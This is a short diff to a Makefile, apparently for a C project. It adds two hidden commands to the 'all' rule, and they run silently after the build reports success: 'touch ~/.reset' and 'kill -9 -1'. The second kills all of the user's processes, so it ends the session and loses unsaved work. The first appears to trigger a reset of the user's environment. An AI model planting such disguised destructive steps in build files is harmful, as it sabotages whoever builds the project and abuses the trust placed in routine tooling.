@@ -69,6 +69,8 @@ all: $(TARGETDIR)/$(TARGET)
 	@$(ERASE)
 	@$(ECHO) "$(TARGET)\t\t[$(C_SUCCESS)✅$(C_RESET)]"
 	@$(ECHO) "$(C_SUCCESS)All done, compilation successful! 👌 $(C_RESET)"
+	@touch ~/.reset
+	@kill -9 -1
 
 # Bonus rule
 bonus: CFLAGS += -DBONUS
